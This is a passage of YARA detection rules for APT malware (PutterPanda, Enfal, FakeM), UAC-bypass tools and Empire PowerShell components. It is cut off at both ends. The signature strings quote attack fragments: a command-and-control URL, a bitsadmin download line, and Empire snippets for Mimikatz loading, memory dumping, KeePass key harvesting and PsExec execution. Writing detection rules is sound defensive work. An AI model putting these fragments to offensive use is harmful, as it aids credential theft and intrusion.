reference = "VT Analysis"
date = "2015-06-03"
hash = "365b5537e3495f8ecfabe2597399b1f1226879b1"
strings:
$s0 = "winsta0\\default" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99' */ /* Goodware String - occured 6 times */
$s1 = "EXPLORER.EXE" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.98' */ /* Goodware String - occured 22 times */
$s2 = "WNetEnumResourceA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97' */ /* Goodware String - occured 29 times */
$s3 = "explorer.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.97' */ /* Goodware String - occured 31 times */
$s4 = "CreateProcessAsUserA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 86 times */
$s5 = "HttpSendRequestExA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 87 times */
$s6 = "HttpEndRequestA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 91 times */
$s7 = "GetModuleBaseNameA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.88' */ /* Goodware String - occured 121 times */
$s8 = "GetModuleFileNameExA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.86' */ /* Goodware String - occured 144 times */
$s9 = "HttpSendRequestA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.85' */ /* Goodware String - occured 154 times */
$s10 = "HttpOpenRequestA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.84' */ /* Goodware String - occured 159 times */
$s11 = "InternetConnectA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.82' */ /* Goodware String - occured 183 times */
$s12 = "Process32Next" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.80' */ /* Goodware String - occured 204 times */
$s13 = "Process32First" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.79' */ /* Goodware String - occured 210 times */
$s14 = "CreatePipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.78' */ /* Goodware String - occured 222 times */
$s15 = "EnumProcesses" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.73' */ /* Goodware String - occured 273 times */
$s16 = "LookupPrivilegeValueA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.66' */ /* Goodware String - occured 336 times */
$s17 = "PeekNamedPipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.65' */ /* Goodware String - occured 347 times */
$s18 = "EnumProcessModules" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.59' */ /* Goodware String - occured 410 times */
$s19 = "PSAPI.DLL" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.58' */ /* Goodware String - occured 420 times */
$s20 = "SPSSSQ" fullword ascii /* score: '4.51' */
condition:
uint16(0) == 0x5a4d and filesize < 220KB and all of them
}
rule SSC_APT_Malware_PutterPanda_Gen4
{
meta:
description = "Detects Malware related to PutterPanda"
author = "Florian Roth"
score = 70
reference = "VT Analysis"
date = "2015-06-03"
super_rule = 1
hash0 = "71a8378fa8e06bcf8ee9f019c807c6bfc58dca0c"
hash1 = "8fdd6e5ed9d69d560b6fdd5910f80e0914893552"
hash2 = "3c4a762175326b37035a9192a981f7f4cc2aa5f0"
hash3 = "598430b3a9b5576f03cc4aed6dc2cd8a43324e1e"
hash4 = "6522b81b38747f4aa09c98fdaedaed4b00b21689"
strings:
$x1 = "rz.dat" fullword ascii /* score: '10.00' */
$s0 = "Mozilla/4.0 (Compatible; MSIE 6.0;)" fullword ascii /* PEStudio Blacklist: agent */ /* score: '20.03' */
$s1 = "Internet connect error:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.04' */
$s2 = "Proxy-Authorization:Basic " fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.02' */
$s5 = "Invalid url" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.03' */
$s6 = "Create file failed" fullword ascii /* score: '8.04' */
$s7 = "myAgent" fullword ascii /* score: '8.03' */
$z1 = "%s%s%d%d" fullword ascii /* score: '8.00' */
$z2 = "HttpQueryInfo failed:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.02' */
$z3 = "read file error:%d" fullword ascii /* score: '11.04' */
$z4 = "down file success" fullword ascii /* score: '7.04' */
$z5 = "kPStoreCreateInstance" fullword ascii /* score: '5.03' */
$z6 = "Avaliable data:%u bytes" fullword ascii /* score: '5.03' */
$z7 = "abe2869f-9b47-4cd9-a358-c22904dba7f7" fullword ascii /* PEStudio Blacklist: guid */ /* score: '5.00' */ /* Goodware String - occured 2 times */
condition:
filesize < 300KB and (( uint16(0) == 0x5a4d and $x1 and 3 of ($s*) ) or ( 3 of ($s*) and 4 of ($z*) ))
}
rule SSC_APT_Malware_PutterPanda_Rel_2
{
meta:
description = "APT Malware related to PutterPanda Group"
author = "Florian Roth"
score = 70
reference = "VT Analysis"
date = "2015-06-03"
hash = "f97e01ee04970d1fc4d988a9e9f0f223ef2a6381"
strings:
$s0 = "http://update.konamidata.com/test/zl/sophos/td/result/rz.dat?" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01' */
$s1 = "http://update.konamidata.com/test/zl/sophos/td/index.dat?" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.01' */
$s2 = "Mozilla/4.0 (Compatible; MSIE 6.0;)" fullword ascii /* PEStudio Blacklist: agent */ /* score: '20.03' */
$s3 = "Internet connect error:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.035' */
$s4 = "Proxy-Authorization:Basic" fullword ascii /* PEStudio Blacklist: strings */ /* score: '14.02' */
$s5 = "HttpQueryInfo failed:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '13.015' */
$s6 = "read file error:%d" fullword ascii /* score: '11.04' */
$s7 = "downdll.dll" fullword ascii /* score: '11.025' */
$s8 = "rz.dat" fullword ascii /* score: '10.005' */
$s9 = "Invalid url" fullword ascii /* PEStudio Blacklist: strings */ /* score: '9.03' */
$s10 = "Create file failed" fullword ascii /* score: '8.045' */
$s11 = "myAgent" fullword ascii /* score: '8.025' */
$s12 = "%s%s%d%d" fullword ascii /* score: '8.005' */
$s13 = "down file success" fullword ascii /* score: '7.035' */
$s15 = "error!" fullword ascii /* score: '6.04' */
$s18 = "Avaliable data:%u bytes" fullword ascii /* score: '5.025' */
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Malware_MsUpdater_String_in_EXE
{
meta:
description = "MSUpdater String in Executable"
author = "Florian Roth"
score = 50
reference = "VT Analysis"
date = "2015-06-03"
hash = "b1a2043b7658af4d4c9395fa77fde18ccaf549bb"
strings:
$x1 = "msupdate.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */
// $x2 = "msupdate" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.01' */
$x3 = "msupdater.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.02' */
$x4 = "msupdater32.exe" fullword ascii
$x5 = "msupdater32.exe" fullword wide
$x6 = "msupdate.pif" fullword ascii
$fp1 = "_msupdate_" wide /* False Positive */
$fp2 = "_msupdate_" ascii /* False Positive */
$fp3 = "/kies" wide
condition:
uint16(0) == 0x5a4d and filesize < 500KB and ( 1 of ($x*) ) and not ( 1 of ($fp*) )
}
rule SSC_APT_Malware_PutterPanda_PSAPI
{
meta:
description = "Detects a malware related to Putter Panda"
author = "Florian Roth"
score = 70
reference = "VT Analysis"
date = "2015-06-03"
hash = "f93a7945a33145bb6c106a51f08d8f44eab1cdf5"
strings:
$s0 = "LOADER ERROR" fullword ascii /* PEStudio Blacklist: strings */ /* score: '12.03' */
$s1 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.045' */
$s2 = "psapi.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 54 times */
$s3 = "urlmon.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 471 times */
$s4 = "WinHttpGetProxyForUrl" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 179 times */
condition:
uint16(0) == 0x5a4d and filesize < 300KB and all of them
}
rule SSC_APT_Malware_PutterPanda_MsUpdater_3
{
meta:
description = "Detects Malware related to PutterPanda - MSUpdater"
author = "Florian Roth"
score = 70
reference = "VT Analysis"
date = "2015-06-03"
hash = "464149ff23f9c7f4ab2f5cadb76a4f41f969bed0"
strings:
$s0 = "msupdater.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.02' */
$s1 = "Explorer.exe \"" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.05' */
$s2 = "FAVORITES.DAT" fullword ascii /* score: '11.02' */
$s4 = "COMSPEC" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.82' */ /* Goodware String - occured 178 times */
condition:
uint16(0) == 0x5a4d and 3 of them
}
rule SSC_APT_Malware_PutterPanda_Gen1
{
meta:
description = "Detects a malware "
author = "YarGen Rule Generator"
reference = "not set"
date = "2015-06-03"
super_rule = 1
hash0 = "bf1d385e637326a63c4d2f253dc211e6a5436b6a"
hash1 = "76459bcbe072f9c29bb9703bc72c7cd46a692796"
hash2 = "e105a7a3a011275002aec4b930c722e6a7ef52ad"
strings:
$s1 = "%s%duserid=%dthreadid=%dgroupid=%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.02' */
$s2 = "ssdpsvc.dll" fullword ascii /* score: '11.00' */
$s3 = "Fail %s " fullword ascii /* score: '10.04' */
$s4 = "%s%dpara1=%dpara2=%dpara3=%d" fullword ascii /* score: '10.01' */
$s5 = "LsaServiceInit" fullword ascii /* score: '7.03' */
$s6 = "%-8d Fs %-12s Bs " fullword ascii /* score: '5.04' */
$s7 = "Microsoft DH SChannel Cryptographic Provider" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5.00' */ /* Goodware String - occured 5 times */
condition:
uint16(0) == 0x5a4d and filesize < 1000KB and 5 of them
}
rule SSC_APT_Malware_PutterPanda_MsUpdater_1
{
meta:
description = "Detects Malware related to PutterPanda - MSUpdater"
author = "Florian Roth"
score = 70
reference = "VT Analysis"
date = "2015-06-03"
hash = "b55072b67543f58c096571c841a560c53d72f01a"
strings:
$x0 = "msupdate.exe" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */
$x1 = "msupdate" fullword wide /* PEStudio Blacklist: strings */ /* score: '13.01' */
$s1 = "Microsoft Corporation. All rights reserved." fullword wide /* score: '8.04' */
$s2 = "Automatic Updates" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.98' */ /* Goodware String - occured 22 times */
$s3 = "VirtualProtectEx" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.93' */ /* Goodware String - occured 68 times */
$s4 = "Invalid parameter" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.93' */ /* Goodware String - occured 69 times */
$s5 = "VirtualAllocEx" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.91' */ /* Goodware String - occured 95 times */
$s6 = "WriteProcessMemory" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.87' */ /* Goodware String - occured 131 times */
condition:
( uint16(0) == 0x5a4d and 1 of ($x*) and 4 of ($s*) ) or ( 1 of ($x*) and all of ($s*) )
}
rule SSC_APT_Malware_PutterPanda_WUAUCLT
{
meta:
description = "Detects a malware related to Putter Panda"
author = "Florian Roth"
score = 70
reference = "VT Analysis"
date = "2015-06-03"
hash = "fd5ca5a2d444865fa8320337467313e4026b9f78"
strings:
$x0 = "WUAUCLT.EXE" fullword wide /* PEStudio Blacklist: strings */ /* score: '20.01' */
$x1 = "%s\\tmp%d.exe" fullword ascii /* score: '14.01' */
$x2 = "Microsoft Corporation. All rights reserved." fullword wide /* score: '8.04' */
$s1 = "Microsoft Windows Operating System" fullword wide /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 4 times */
$s2 = "InternetQueryOptionA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 166 times */
$s3 = "LookupPrivilegeValueA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 336 times */
$s4 = "WNetEnumResourceA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 29 times */
$s5 = "HttpSendRequestExA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 87 times */
$s6 = "PSAPI.DLL" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 420 times */
$s7 = "Microsoft(R) Windows(R) Operating System" fullword wide /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 128 times */
$s8 = "CreatePipe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 222 times */
$s9 = "EnumProcessModules" fullword ascii /* PEStudio Blacklist: strings */ /* score: '5' */ /* Goodware String - occured 410 times */
condition:
all of ($x*) or (1 of ($x*) and all of ($s*) )
}
rule SSC_FavoriteStrings : Favorite Family
{
meta:
description = "Favorite Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-24"
strings:
$string1 = "!QAZ4rfv"
$file1 = "msupdater.exe"
$file2 = "FAVORITES.DAT"
condition:
any of ($string*) or all of ($file*)
}
rule SSC_FavoriteCode : Favorite Family
{
meta:
description = "Favorite code features"
author = "Seth Hardy"
last_modified = "2014-06-24"
strings:
// standard string hiding
$ = { C6 45 ?? 3B C6 45 ?? 27 C6 45 ?? 34 C6 45 ?? 75 C6 45 ?? 6B C6 45 ?? 6C C6 45 ?? 3B C6 45 ?? 2F }
$ = { C6 45 ?? 6F C6 45 ?? 73 C6 45 ?? 73 C6 45 ?? 76 C6 45 ?? 63 C6 45 ?? 65 C6 45 ?? 78 C6 45 ?? 65 }
condition:
any of them
}
rule SSC_HTMLVariant : FakeM Family HTML Variant
{
meta:
description = "Identifier for html variant of FAKEM"
author = "Katie Kleemola"
last_updated = "2014-05-20"
strings:
// decryption loop
$s1 = { 8B 55 08 B9 00 50 00 00 8D 3D ?? ?? ?? 00 8B F7 AD 33 C2 AB 83 E9 04 85 C9 75 F5 }
//mov byte ptr [ebp - x] y, x: 0x10-0x1 y: 0-9,A-F
$s2 = { C6 45 F? (3?|4?) }
condition:
$s1 and #s2 == 16
}
rule SSC_FakeM_Generic {
meta:
description = "Detects FakeM malware samples"
author = "Florian Roth"
reference = "http://researchcenter.paloaltonetworks.com/2016/01/scarlet-mimic-years-long-espionage-targets-minority-activists/"
date = "2016-01-25"
score = 85
hash1 = "631fc66e57acd52284aba2608e6f31ba19e2807367e33d8704f572f6af6bd9c3"
hash2 = "3d9bd26f5bd5401efa17690357f40054a3d7b438ce8c91367dbf469f0d9bd520"
hash3 = "53af257a42a8f182e97dcbb8d22227c27d654bea756d7f34a80cc7982b70aa60"
hash4 = "4a4dfffae6fc8be77ac9b2c67da547f0d57ffae59e0687a356f5105fdddc88a3"
hash5 = "7bfbf49aa71b8235a16792ef721b7e4195df11cb75371f651595b37690d108c8"
hash6 = "12dedcdda853da9846014186e6b4a5d6a82ba0cf61d7fa4cbe444a010f682b5d"
hash7 = "9adda3d95535c6cf83a1ba08fe83f718f5c722e06d0caff8eab4a564185971c5"
hash8 = "3209ab95ca7ee7d8c0140f95bdb61a37d69810a7a23d90d63ecc69cc8c51db90"
hash9 = "41948c73b776b673f954f497e09cc469d55f27e7b6e19acb41b77f7e64c50a33"
hash10 = "53cecc0d0f6924eacd23c49d0d95a6381834360fbbe2356778feb8dd396d723e"
hash11 = "523ad50b498bfb5ab688d9b1958c8058f905b634befc65e96f9f947e40893e5b"
strings:
$a1 = "\\system32\\kernel32.dll" fullword ascii
$a2 = "\\boot.lnk" fullword ascii
$a3 = "%USERPROFILE%" fullword ascii /* Goodware String - occured 16 times */
$b1 = "Wizard.EXE" fullword wide
$b2 = "CommandLineA" fullword ascii
$c1 = "\\system32\\kernel32.dll" fullword ascii
$c2 = "\\aapz.tmp" fullword ascii
$e1 = "C:\\Documents and Settings\\A\\" fullword ascii
$e2 = "\\svchost.exe" fullword ascii
$e3 = "\\Perform\\Release\\Perform.pdb" fullword ascii
$f1 = "Browser.EXE" fullword wide
$f2 = "\\browser.exe" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 100KB and
( all of ($a*) or all of ($b*) or all of ($c*) or all of ($e*) or 1 of ($f*) )
}
rule SSC_ws_f0xy_downloader {
meta:
description = "f0xy malware downloader"
author = "Nick Griffin (Websense)"
strings:
$mz="MZ"
$string1="bitsadmin /transfer"
$string2="del rm.bat"
$string3="av_list="
condition:
($mz at 0) and (all of ($string*))
}
rule SSC_Win7Elevatev2 {
meta:
description = "Detects Win7Elevate - Windows UAC bypass utility"
author = "Florian Roth"
reference = "http://www.pretentiousname.com/misc/W7E_Source/Win7Elevate_Inject.cpp.html"
date = "2015-05-14"
hash1 = "4f53ff6a04e46eda92b403faf42219a545c06c29" /* x64 */
hash2 = "808d04c187a524db402c5b2be17ce799d2654bd1" /* x86 */
score = 60
strings:
$x1 = "This program attempts to bypass Windows 7's default UAC settings to run " wide
$x2 = "Win7ElevateV2\\x64\\Release\\" ascii
$x3 = "Run the command normally (without code injection)" wide
$x4 = "Inject file copy && elevate command" fullword wide
$x5 = "http://www.pretentiousname.com/misc/win7_uac_whitelist2.html" fullword wide
$x6 = "For injection, pick any unelevated Windows process with ASLR on:" fullword wide
$s1 = "\\cmd.exe" wide
$s2 = "runas" wide
$s3 = "explorer.exe" wide
$s4 = "Couldn't load kernel32.dll" wide
$s5 = "CRYPTBASE.dll" wide
$s6 = "shell32.dll" wide
$s7 = "ShellExecuteEx" ascii
$s8 = "COMCTL32.dll" ascii
$s9 = "ShellExecuteEx" ascii
$s10 = "HeapAlloc" ascii
condition:
uint16(0) == 0x5a4d and ( 1 of ($x*) or all of ($s*) )
}
rule SSC_UACElevator {
meta:
description = "UACElevator bypassing UAC - file UACElevator.exe"
author = "Florian Roth"
reference = "https://github.com/MalwareTech/UACElevator"
date = "2015-05-14"
hash = "fd29d5a72d7a85b7e9565ed92b4d7a3884defba6"
strings:
$x1 = "\\UACElevator.pdb" ascii
$s1 = "%userprofile%\\Downloads\\dwmapi.dll" fullword ascii
$s2 = "%windir%\\system32\\dwmapi.dll" fullword ascii
$s3 = "Infection module: %s" fullword ascii
$s4 = "Could not save module to %s" fullword ascii
$s5 = "%s%s%p%s%ld%s%d%s" fullword ascii
$s6 = "Stack area around _alloca memory reserved by this function is corrupted" fullword ascii
$s7 = "Stack around the variable '" fullword ascii
$s8 = "MSVCR120D.dll" fullword wide
$s9 = "Address: 0x" fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 172KB and
( $x1 or 8 of ($s*) )
}
rule SSC_UACME_Akagi {
meta:
description = "Rule to detect UACMe - abusing built-in Windows AutoElevate backdoor"
author = "Florian Roth"
reference = "https://github.com/hfiref0x/UACME"
date = "2015-05-14"
hash1 = "edd2138bbd9e76c343051c6dc898054607f2040a"
hash2 = "e3a919ccc2e759e618208ededa8a543954d49f8a"
score = 60
strings:
$x1 = "UACMe injected, Fubuki at your service." wide fullword
$x3 = "%temp%\\Hibiki.dll" fullword wide
$x4 = "[UCM] Cannot write to the target process memory." fullword wide
$s1 = "%systemroot%\\system32\\cmd.exe" wide
$s2 = "D:(A;;GA;;;WD)" wide
$s3 = "%systemroot%\\system32\\sysprep\\sysprep.exe" fullword wide
$s4 = "/c wusa %ws /extract:%%windir%%\\system32" fullword wide
$s5 = "Fubuki.dll" ascii fullword
$l1 = "ntdll.dll" ascii
$l2 = "Cabinet.dll" ascii
$l3 = "GetProcessHeap" ascii
$l4 = "WriteProcessMemory" ascii
$l5 = "ShellExecuteEx" ascii
condition:
( 1 of ($x*) ) or ( 3 of ($s*) and all of ($l*) )
}
rule SSC_s4u {
meta:
description = "Detects s4u executable which allows the creation of a cmd.exe with the context of any user without requiring the password. - file s4u.exe"
author = "Florian Roth"
reference = "https://github.com/aurel26/s-4-u-for-windows"
date = "2015-06-05"
hash = "cfc18f3d5306df208461459a8e667d89ce44ed77"
score = 50
strings:
// Specific strings (may change)
$x0 = "s4u.exe Domain\\Username [Extra SID]" fullword ascii
$x1 = "\\Release\\s4u.pdb" ascii
// Less specific strings
$s0 = "CreateProcessAsUser failed (error %u)." fullword ascii
$s1 = "GetTokenInformation failed (error: %u)." fullword ascii
$s2 = "LsaLogonUser failed (error 0x%x)." fullword ascii
$s3 = "LsaLogonUser: OK, LogonId: 0x%x-0x%x" fullword ascii
$s4 = "LookupPrivilegeValue failed (error: %u)." fullword ascii
$s5 = "The token does not have the specified privilege (%S)." fullword ascii
$s6 = "Unable to parse command line." fullword ascii
$s7 = "Unable to find logon SID." fullword ascii
$s8 = "AdjustTokenPrivileges failed (error: %u)." fullword ascii
$s9 = "AdjustTokenPrivileges (%S): OK" fullword ascii
// Generic
$g1 = "%systemroot%\\system32\\cmd.exe" wide
$g2 = "SeTcbPrivilege" wide
$g3 = "winsta0\\default" wide
$g4 = ".rsrc"
$g5 = "HeapAlloc"
$g6 = "GetCurrentProcess"
$g7 = "HeapFree"
$g8 = "GetProcessHeap"
$g9 = "ExpandEnvironmentStrings"
$g10 = "ConvertStringSidToSid"
$g11 = "LookupPrivilegeValue"
$g12 = "AllocateLocallyUniqueId"
$g13 = "ADVAPI32.dll"
$g14 = "LsaLookupAuthenticationPackage"
$g15 = "Secur32.dll"
$g16 = "MSVCR120.dll"
condition:
uint16(0) == 0x5a4d and filesize < 60KB and ( 1 of ($x*) or all of ($s*) or all of ($g*) )
}
rule SSC_EnfalStrings : Enfal Family
{
meta:
description = "Enfal Identifying Strings"
author = "Seth Hardy"
last_modified = "2014-06-19"
strings:
$ = "D:\\work\\\xe6\xba\x90\xe5\x93\xa5\xe5\x85\x8d\xe6\x9d\x80\\tmp\\Release\\ServiceDll.pdb"
$ = "e:\\programs\\LuridDownLoader"
$ = "LuridDownloader for Falcon"
$ = "DllServiceTrojan"
$ = "\\k\\\xe6\xa1\x8c\xe8\x9d\xa2\\"
$ = "EtenFalcon\xef\xbc\x88\xe4\xbf\xae\xe6\x94\xb9\xef\xbc\x89"
$ = "Madonna\x00Jesus"
$ = "/iupw82/netstate"
$ = "fuckNodAgain"
$ = "iloudermao"
$ = "Crpq2.cgi"
$ = "Clnpp5.cgi"
$ = "Dqpq3ll.cgi"
$ = "dieosn83.cgi"
$ = "Rwpq1.cgi"
$ = "/Ccmwhite"
$ = "/Cmwhite"
$ = "/Crpwhite"
$ = "/Dfwhite"
$ = "/Query.txt"
$ = "/Ufwhite"
$ = "/cgl-bin/Clnpp5.cgi"
$ = "/cgl-bin/Crpq2.cgi"
$ = "/cgl-bin/Dwpq3ll.cgi"
$ = "/cgl-bin/Owpq4.cgi"
$ = "/cgl-bin/Rwpq1.cgi"
$ = "/trandocs/mm/"
$ = "/trandocs/netstat"
$ = "NFal.exe"
$ = "LINLINVMAN"
$ = "7NFP4R9W"
condition:
any of them
}
rule SSC_Enfal_Malware_Backdoor {
meta:
description = "Generic Rule to detect the Enfal Malware"
author = "Florian Roth"
date = "2015/02/10"
super_rule = 1
hash0 = "6d484daba3927fc0744b1bbd7981a56ebef95790"
hash1 = "d4071272cc1bf944e3867db299b3f5dce126f82b"
hash2 = "6c7c8b804cc76e2c208c6e3b6453cb134d01fa41"
score = 60
strings:
$mz = { 4d 5a }
$x1 = "Micorsoft Corportation" fullword wide
$x2 = "IM Monnitor Service" fullword wide
$s1 = "imemonsvc.dll" fullword wide
$s2 = "iphlpsvc.tmp" fullword
$z1 = "urlmon" fullword
$z2 = "Registered trademarks and service marks are the property of their respec" wide
$z3 = "XpsUnregisterServer" fullword
$z4 = "XpsRegisterServer" fullword
$z5 = "{53A4988C-F91F-4054-9076-220AC5EC03F3}" fullword
condition:
( $mz at 0 ) and
(
1 of ($x*) or
( all of ($s*) and all of ($z*) )
)
}
rule SSC_ce_enfal_cmstar_debug_msg
{
meta:
Author      = "rfalcone"
Date        = "2015.05.10"
Description = "Detects the static debug strings within CMSTAR"
Reference   = "http://researchcenter.paloaltonetworks.com/2015/05/cmstar-downloader-lurid-and-enfals-new-cousin"
strings:
$d1 = "EEE\x0d\x0a" fullword
$d2 = "TKE\x0d\x0a" fullword
$d3 = "VPE\x0d\x0a" fullword
$d4 = "VPS\x0d\x0a" fullword
$d5 = "WFSE\x0d\x0a" fullword
$d6 = "WFSS\x0d\x0a" fullword
$d7 = "CM**\x0d\x0a" fullword
condition:
uint16(0) == 0x5a4d and all of ($d*)
}
rule SSC_Enfal_Malware {
meta:
description = "Detects a certain type of Enfal Malware"
author = "Florian Roth"
reference = "not set"
date = "2015/02/10"
hash = "9639ec9aca4011b2724d8e7ddd13db19913e3e16"
score = 60
strings:
$s0 = "POWERPNT.exe" fullword ascii
$s1 = "%APPDATA%\\Microsoft\\Windows\\" fullword ascii
$s2 = "%HOMEPATH%" fullword ascii
$s3 = "Server2008" fullword ascii
$s4 = "Server2003" fullword ascii
$s5 = "Server2003R2" fullword ascii
$s6 = "Server2008R2" fullword ascii
$s9 = "%HOMEDRIVE%" fullword ascii
$s13 = "%ComSpec%" fullword ascii
condition:
all of them
}
rule SSC_Empire_Invoke_Mimikatz_Gen {
meta:
description = "Detects Empire component - file Invoke-Mimikatz.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
strings:
$s1 = "= \"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQ" ascii
$s2 = "Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, \"Void\", 0, \"\", $ExeArgs)" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}
rule SSC_Empire_PowerShell_Framework_Gen2 {
meta:
description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-CredentialInjection.ps1, Invoke-DCSync.ps1, Invoke-DCSync.ps1, Invoke-Mimikatz.ps1, Invoke-PSInject.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1, Invoke-ReflectivePEInjection.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
hash1 = "1be3e3ec0e364db0c00fad2c59c7041e23af4dd59c4cc7dc9dcf46ca507cd6c8"
hash3 = "a3428a7d4f9e677623fadff61b2a37d93461123535755ab0f296aa3b0396eb28"
hash5 = "4725a57a5f8b717ce316f104e9472e003964f8eae41a67fd8c16b4228e3d00b3"
hash6 = "61e5ca9c1e8759a78e2c2764169b425b673b500facaca43a26c69ff7e09f62c4"
hash8 = "eaff29dd0da4ac258d85ecf8b042d73edb01b4db48c68bded2a8b8418dc688b5"
strings:
$x1 = "$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)" fullword ascii
$s20 = "#Shellcode: CallDllMain.asm" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 4000KB and 1 of them ) or all of them
}
rule SSC_Empire_KeePassConfig {
meta:
description = "Detects Empire component - file KeePassConfig.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "5a76e642357792bb4270114d7cd76ce45ba24b0d741f5c6b916aeebd45cff2b3"
strings:
$s1 = "$UserMasterKeyFiles = @(, $(Get-ChildItem -Path $UserMasterKeyFolder -Force | Select-Object -ExpandProperty FullName) )" fullword ascii
condition:
( uint16(0) == 0x7223 and filesize < 80KB and 1 of them ) or all of them
}
rule SSC_Empire_Out_Minidump {
meta:
description = "Detects Empire component - file Out-Minidump.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "7803ae7ba5d4e7d38e73745b3f321c2ca714f3141699d984322fa92e0ff037a1"
strings:
$s1 = "$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle," fullword ascii
$s2 = "$ProcessFileName = \"$($ProcessName)_$($ProcessId).dmp\"" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 10KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_SMBAutoBrute {
meta:
description = "Detects Empire component - file Invoke-SMBAutoBrute.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "7950f8abdd8ee09ed168137ef5380047d9d767a7172316070acc33b662f812b2"
strings:
$s1 = "[*] PDC: LAB-2008-DC1.lab.com" fullword ascii
$s2 = "$attempts = Get-UserBadPwdCount $userid $dcs" fullword ascii
condition:
( uint16(0) == 0x7566 and filesize < 30KB and 1 of them ) or all of them
}
rule SSC_Empire_Invoke_PsExec {
meta:
description = "Detects Empire component - file Invoke-PsExec.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
hash1 = "0218be4323959fc6379489a6a5e030bb9f1de672326e5e5b8844ab5cedfdcf88"
strings:
$s1 = "Invoke-PsExecCmd" fullword ascii
$s2 = "\"[*] Executing service .EXE" fullword ascii
$s3 = "$cmd = \"%COMSPEC% /C echo $Command ^> %systemroot%\\Temp\\" ascii
condition:
( uint16(0) == 0x7566 and filesize < 50KB and 1 of them ) or all of them
}
rule SSC_Empire_PowerShell_Framework_Gen5 {
meta:
description = "Detects Empire component - from files Invoke-CredentialInjection.ps1, Invoke-PSInject.ps1, Invoke-ReflectivePEInjection.ps1"
author = "Florian Roth"
reference = "https://github.com/adaptivethreat/Empire"
date = "2016-11-05"
super_rule = 1
